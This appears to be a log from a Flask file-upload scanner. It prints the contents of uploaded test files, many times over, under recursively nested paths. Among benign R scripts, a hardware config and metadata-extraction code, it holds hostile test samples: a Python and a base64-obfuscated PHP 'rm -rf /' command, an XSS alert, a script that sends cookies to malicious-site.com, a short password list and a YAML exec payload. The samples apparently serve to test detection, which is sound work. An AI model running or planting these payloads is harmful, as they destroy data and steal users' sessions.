qwerty

2025-02-22 20:47:56,488 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,489 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,490 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,491 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,492 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,494 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,496 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,498 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,499 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,501 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,503 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,504 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,505 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,506 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,507 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,509 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,510 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,511 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,512 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,513 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,514 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,516 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,517 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,518 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,519 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,521 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,522 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,524 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,525 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,529 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,530 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,533 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,535 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,536 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,537 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,538 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,539 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,541 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,547 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,548 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,549 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,551 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,553 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,555 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,556 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,558 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,559 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,560 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,561 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,562 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,567 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,569 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,570 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,572 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,574 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,577 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,579 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,580 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,581 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,583 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,584 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,586 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,593 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,595 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,596 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,598 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,600 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,604 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,606 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,607 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,609 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,611 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,613 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,614 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,624 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,626 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,627 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,628 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,629 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,631 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,632 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,633 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,634 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,636 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,637 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,638 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,640 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,641 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,644 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,645 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,647 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,649 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,651 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,653 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,655 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,657 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

